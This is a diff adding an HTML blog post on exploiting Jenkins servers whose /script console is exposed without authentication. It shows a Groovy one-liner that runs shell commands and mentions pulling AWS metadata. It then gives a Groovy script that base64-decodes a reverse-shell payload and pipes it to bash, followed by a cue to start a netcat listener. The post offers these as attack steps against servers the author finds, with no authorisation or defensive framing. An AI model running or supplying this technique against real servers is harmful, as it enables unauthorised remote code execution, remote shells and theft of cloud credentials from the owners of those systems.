@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+	<head>
+		<meta name="viewport" content="width=device-width, initial-scale=1.0">
+		<meta charset="utf-8" />
+		<link rel="stylesheet" type="text/css" href="css/style.css" />
+		<title>Jenkins Server Exploitation: Unauthenticated RCE and Data Exfiltration</title>
+	</head>
+<body>
+<h1>Jenkins Server Exploitation: Unauthenticated RCE and Data Exfiltration</h1>
+
+<h2>How I found a Jenkins server which was exposing the script console.</h2>
+
+<p><strong> Lets start of by explaining a bit about Jenkins servers and the script console.</strong></p>
+
+<p>Jenkins is an open-source automation server that enables developers to build, test, and deploy their software continuously.</p>
+
+<p>The Script Console (/script) is a powerful Jenkins feature that allows administrators to execute Groovy scripts directly on the Jenkins server with full system access.</p>
+
+<p>Once you find a server that allows you to visit the /script console without authentications is a win. From the console you can execute commands and extract sensitive data or information.</p>
+
+<p>How can I execute commands on the console?</p>
+
+<p>Examples:</p>
+
+<figure><img src="Images/jenkins_commands.png"/></figure>
+
+<p>By using &quot;whoami&quot;.execute().text you can see that the command <em>whoami</em> got executed, this is a clear indication that we can run commands on the server.</p>
+
+<p>What other information can you extract from the console?</p>
+
+<figure><img src="Images/jenkins_aws.png"/></figure>
+
+<p>As you can see in the image above, you can also extract AWS metadata information.</p>
+
+<p>You can also get a reverse shell, but the script is a bit different from a normal command. I will show you a groovy script that you can use to get a reverse shell on the system.</p>
+
+<pre><code>def encodedCmd = &quot;Your reverse shell encoded with base64&quot;
+def cmd = [&quot;bash&quot;, &quot;-c&quot;, &quot;echo &quot; + encodedCmd + &quot; | base64 -d | bash&quot;]
+
+try {
+    def process = cmd.execute()
+    println &quot;Reverse shell command executed&quot;
+    println &quot;Check your listener for connection...&quot;
+    // Don&#39;t wait for this process as it should connect back
+} catch (Exception e) {
+    println &quot;Error: &quot; + e.message
+}</code></pre>
+
+<p>All you have to do now is start a netcat listener to catch the reverse shell.</p>
+
+<p>The exposed script console is one of the most critical Jenkins vulnerabilities, providing direct access to the underlying system! </p>
+
+<h1>HAPPY HACKING</h1>
+
+</body>
+</html>
+
